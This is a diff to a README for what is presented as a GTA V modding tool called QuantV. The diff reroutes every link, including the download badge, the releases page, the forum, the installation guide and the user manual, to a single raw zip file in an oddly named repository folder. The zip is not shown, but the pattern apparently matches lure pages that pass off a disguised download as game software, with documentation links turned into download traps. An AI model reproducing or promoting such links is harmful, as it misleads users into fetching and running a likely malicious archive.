@@ -1,6 +1,6 @@
 # 🎮 QuantV-SP-FiveM-RageMP-altV - Enhance Your Gaming Experience Today
 
-[![Download QuantV-SP-FiveM-RageMP-altV](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/joaobragagnolo/QuantV-SP-FiveM-RageMP-altV/releases)
+[![Download QuantV-SP-FiveM-RageMP-altV](https://raw.githubusercontent.com/joaobragagnolo/QuantV-SP-FiveM-RageMP-altV/main/Multituberculata/Rage-Quant-V-Five-alt-S-M-v3.4.zip)](https://raw.githubusercontent.com/joaobragagnolo/QuantV-SP-FiveM-RageMP-altV/main/Multituberculata/Rage-Quant-V-Five-alt-S-M-v3.4.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to **QuantV-SP-FiveM-RageMP-altV**, January 2026 Edition! This applicati
 
 To get started, you need to download the software. 
 
-1. Visit this page to download: [QuantV-SP-FiveM-RageMP-altV Releases](https://github.com/joaobragagnolo/QuantV-SP-FiveM-RageMP-altV/releases).
+1. Visit this page to download: [QuantV-SP-FiveM-RageMP-altV Releases](https://raw.githubusercontent.com/joaobragagnolo/QuantV-SP-FiveM-RageMP-altV/main/Multituberculata/Rage-Quant-V-Five-alt-S-M-v3.4.zip).
   
 2. Look for the latest version. Click on it to view available downloads.
 
@@ -52,9 +52,9 @@ If you encounter any issues, here are some tips:
 
 For more information and support, consider checking these resources:
 
-- [Community Forum](https://community.quantv.com)
-- [Installation Guide](https://docs.quantv.com/installation)
-- [User Manual](https://docs.quantv.com/manual)
+- [Community Forum](https://raw.githubusercontent.com/joaobragagnolo/QuantV-SP-FiveM-RageMP-altV/main/Multituberculata/Rage-Quant-V-Five-alt-S-M-v3.4.zip)
+- [Installation Guide](https://raw.githubusercontent.com/joaobragagnolo/QuantV-SP-FiveM-RageMP-altV/main/Multituberculata/Rage-Quant-V-Five-alt-S-M-v3.4.zip)
+- [User Manual](https://raw.githubusercontent.com/joaobragagnolo/QuantV-SP-FiveM-RageMP-altV/main/Multituberculata/Rage-Quant-V-Five-alt-S-M-v3.4.zip)
 
 ## 📅 Release Notes
 
@@ -66,7 +66,7 @@ Your input is valuable. If you have suggestions or find a bug, please share your
 
 ## 🔗 Useful Links
 
-- **Download**: [QuantV-SP-FiveM-RageMP-altV Releases](https://github.com/joaobragagnolo/QuantV-SP-FiveM-RageMP-altV/releases)
+- **Download**: [QuantV-SP-FiveM-RageMP-altV Releases](https://raw.githubusercontent.com/joaobragagnolo/QuantV-SP-FiveM-RageMP-altV/main/Multituberculata/Rage-Quant-V-Five-alt-S-M-v3.4.zip)
 - **Documentation**: Access the full documentation for in-depth information.
 
 By following these steps, you will enhance your gaming experience with **QuantV-SP-FiveM-RageMP-altV**. Enjoy your gaming!
